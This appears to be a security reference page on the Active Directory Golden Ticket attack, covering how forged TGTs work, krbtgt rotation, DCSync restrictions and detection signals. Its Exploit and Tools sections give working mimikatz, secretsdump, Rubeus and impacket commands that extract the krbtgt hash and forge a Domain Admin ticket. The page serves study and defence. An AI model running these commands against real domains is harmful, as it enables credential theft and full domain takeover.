---
---

# Golden Ticket

Forging Ticket-Granting Tickets with the KRBTGT account key.

A Golden Ticket is a forged TGT encrypted with the `krbtgt` account's secret key. Because every
domain controller uses this key to validate TGTs, a forged ticket is accepted as legitimate by
every KDC in the domain. The attacker can claim any identity, any group membership, and any
ticket lifetime -- and the KDC will trust it unconditionally.

This is the most powerful persistence technique in Active Directory. A single key compromise
grants complete domain control until that key is rotated.

---

## How It Works

During the [TGS Exchange](../../protocol/tgs-exchange.md), the client presents a TGT to the KDC.
The KDC decrypts the TGT using the `krbtgt` account's key, reads the
[PAC](../../protocol/tickets.md#pac), and uses the PAC contents to build service tickets. The KDC
trusts the decrypted PAC contents without cross-referencing them against the Active Directory
database -- with one exception: per [MS-KILE &sect;3.3.5.7.1], TGTs older than 20 minutes trigger
an account-revocation check (disabled, expired, locked, outside logon hours) against AD.

!!! note "Post-CVE-2022-37967 enforcement changes the 20-minute window"
    The 20-minute PAC revalidation interval described above reflects the **pre-enforcement** spec
    behavior. Post-CVE-2022-37967 (KB5020009), in full enforcement mode, PAC SID validation
    occurs on **every** TGS-REQ regardless of TGT age. The KDC validates the PAC's SIDs against
    Active Directory on each service ticket request, eliminating the 20-minute grace window.
    Full enforcement mode is the default on domain controllers with January 2025+ cumulative
    updates.

If an attacker possesses the `krbtgt` key, they can construct a TGT from scratch:

1. Build an `EncTicketPart` structure with arbitrary values:
    - **cname**: any username (including non-existent ones)
    - **PAC group SIDs**: Domain Admins (512), Enterprise Admins (519), Schema Admins (518), or
      any other groups
    - **endtime/renew-till**: any lifetime (attackers commonly use 10 years)
    - **authtime**: any timestamp
2. Encrypt the `EncTicketPart` with the `krbtgt` key
3. Construct the outer `Ticket` structure with `sname = krbtgt/REALM`
4. Present this forged TGT to the KDC in a TGS-REQ

The KDC decrypts the TGT, reads the PAC, and issues a service ticket with the attacker's chosen
group memberships. The service ticket grants whatever access those groups provide.

!!! danger "No preceding AS Exchange"
    A Golden Ticket bypasses the [AS Exchange](../../protocol/as-exchange.md) entirely. There is no
    `PA-ENC-TIMESTAMP`, no password validation, and no Event 4768 on the domain controller. The
    first KDC interaction is a TGS-REQ with the forged TGT.

### Why Rotation Requires Two Password Changes

Active Directory maintains the current and previous `krbtgt` keys simultaneously to allow
seamless key rotation. When the `krbtgt` password is changed, the KDC stores the new key and
keeps the old one as a fallback. TGTs encrypted with the old key remain valid during the
transition period.

This means:

- **First rotation**: old key becomes the "previous" key; Golden Tickets encrypted with the old
  key still work because the KDC tries the previous key if the current one fails
- **Second rotation**: the original compromised key is no longer stored; Golden Tickets encrypted
  with it stop working

The second rotation must occur **after replication completes** across all domain controllers. If
the second change happens before all DCs have replicated the first, some DCs may still accept the
compromised key.

---

## Defend

### KRBTGT Password Rotation

Rotate the `krbtgt` password **twice** with at least one full replication cycle between changes.
Microsoft recommends rotation at least every 180 days, and immediately after any suspected
compromise.

```powershell title="Check when the krbtgt password was last set"
# Check when krbtgt password was last set
Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet
```

!!! warning "Don't rush the second rotation"
    Allow at least 12-24 hours between the first and second `krbtgt` password changes to ensure
    all domain controllers have replicated the first change. Premature second rotation can cause
    authentication outages.

### Restrict DCSync Privileges

The `krbtgt` hash is most commonly obtained through DCSync -- replicating credentials from a
domain controller over the network. Only these principals should have the
`Replicating Directory Changes All` permission:

- Domain Controllers (computer accounts)
- Domain Admins (inherently)
- Azure AD Connect (if hybrid)

Audit this regularly:

```powershell title="Find principals with DCSync rights on the domain object"
# Find principals with DCSync rights
(Get-Acl "AD:DC=corp,DC=local").Access |
    Where-Object { $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" } |
    Select-Object IdentityReference
```

### Tiered Administration

Tier 0 credentials (Domain Admins, DC computer accounts) must never be exposed on Tier 1 or Tier
2 systems. If an attacker compromises a workstation where a Domain Admin has logged in, they can
extract that credential and use it to DCSync the `krbtgt` hash.

### PAC Validation

Enable KDC signature validation on critical services by setting the registry key:

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters
  ValidateKdcPacSignature = 1 (DWORD)
```

This forces the service to contact a domain controller to verify the
[PAC KDC signature](../../protocol/tickets.md#pac), adding a validation step that catches some
forged ticket scenarios. However, a Golden Ticket is signed with the real `krbtgt` key, so PAC
validation alone does not prevent the attack -- it helps when combined with PAC content anomaly
detection.

---

## Detect

Golden Tickets are difficult to detect because the forged TGT is cryptographically valid. Detection
relies on identifying anomalies in the ticket metadata or usage patterns.

### Missing AS Exchange

A Golden Ticket is used directly in a TGS-REQ without a preceding AS-REQ. Look for:

- **Event 4769** (TGS request) for a user **without** a matching **Event 4768** (TGT request)
  from the same user in the expected timeframe
- This requires correlating 4768 and 4769 events -- a missing 4768 before a 4769 is suspicious

### Anomalous Ticket Metadata

| Anomaly | What to look for |
|---|---|
| Ticket lifetime | TGTs with lifetimes far exceeding the 10-hour domain default (e.g., 10 years) |
| Non-existent users | Service ticket requests for usernames that do not exist in Active Directory |
| SID mismatch | The SID in the PAC does not match the SID associated with the username in AD |
| Domain field | Empty or incorrect domain name in the ticket |
| Missing fields | Fields that a legitimate KDC always populates but an attacker's tool omitted |

### Behavioral Indicators

- A user suddenly accessing resources they have never accessed before
- Lateral movement patterns inconsistent with the user's role
- Service ticket requests from IP addresses not associated with the claimed user

### Advanced Detection

Microsoft Defender for Identity can detect Golden Ticket usage by comparing PAC contents against
Active Directory. Custom SIEM rules can look for:

- TGS requests where the account SID in the event does not match the SID stored in AD for that
  `sAMAccountName`
- TGS requests with anomalous ticket options or encryption types

!!! info "Detection is hard -- but improving"
    Because the Golden Ticket is encrypted with the real `krbtgt` key, the cryptographic
    validation at the KDC succeeds. Detection must focus on metadata anomalies and behavioral
    analysis, not cryptographic verification.

    However, CVE-2022-37967 enforcement mode (default on January 2025+ cumulative updates) adds
    strong **server-side** detection. The KDC validates PAC SIDs against Active Directory on
    every TGS-REQ and rejects mismatches with `KDC_ERR_TGT_REVOKED` (Event ID 38). This means
    Golden Tickets with fabricated group memberships (e.g., claiming Domain Admins without
    actual membership) are rejected at the KDC rather than requiring downstream detection. A
    Golden Ticket with the `krbtgt` key can still forge a TGT, but the PAC contents must now
    match AD -- significantly reducing the attack's value.

---

## Exploit

### Prerequisites

1. **KRBTGT hash** -- obtained through one of:
    - DCSync: `mimikatz lsadump::dcsync /user:krbtgt`
    - NTDS.dit extraction: `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
    - Direct domain controller compromise
2. **Domain name** -- e.g., `CORP.LOCAL`
3. **Domain SID** -- e.g., `S-1-5-21-1234567890-1234567890-1234567890`
4. **Target username** -- typically `Administrator`, but can be any name

### Step-by-Step

1. **Obtain the KRBTGT hash**:

    ```
    mimikatz # lsadump::dcsync /user:krbtgt
    ```

    The output includes the NT hash and AES keys for the `krbtgt` account.

2. **Determine the domain SID**:

    ```powershell
    # PowerShell
    (Get-ADDomain).DomainSID.Value
    ```

    ```bash
    # impacket (from Linux)
    lookupsid.py CORP.LOCAL/admin:password@10.0.0.1
    ```

3. **Forge the Golden Ticket**:

    ```
    mimikatz # kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:<ntlm_hash> /user:administrator /groups:512,513,518,519,520 /ptt
    ```

    This creates a forged TGT claiming to be `administrator` with Domain Admins (512), Domain
    Users (513), Schema Admins (518), Enterprise Admins (519), and Group Policy Creator Owners
    (520) group memberships, and injects it into the current session.

4. **Use the forged TGT**:

    ```
    # Access any resource as administrator
    dir \\dc01.corp.local\c$
    ```

    The forged TGT is sent to the KDC in a TGS-REQ. The KDC decrypts it, reads the PAC, and
    issues a service ticket with Domain Admin privileges.

---

## Tools

!!! info "kerbwolf does not implement Golden Ticket forging"
    Golden Ticket creation requires the `krbtgt` key, which is a post-compromise persistence
    technique. kerbwolf focuses on the authentication exchange, not ticket forging.

| Tool | Command | Notes |
|---|---|---|
| mimikatz | `kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:<hash> /user:administrator /ptt` | Forges TGT and injects into memory |
| Rubeus | `Rubeus.exe golden /rc4:<hash> /user:administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /ptt` | Supports RC4 and AES keys |
| impacket | `ticketer.py -nthash <hash> -domain-sid S-1-5-21-... -domain CORP.LOCAL administrator` | Outputs ccache file |
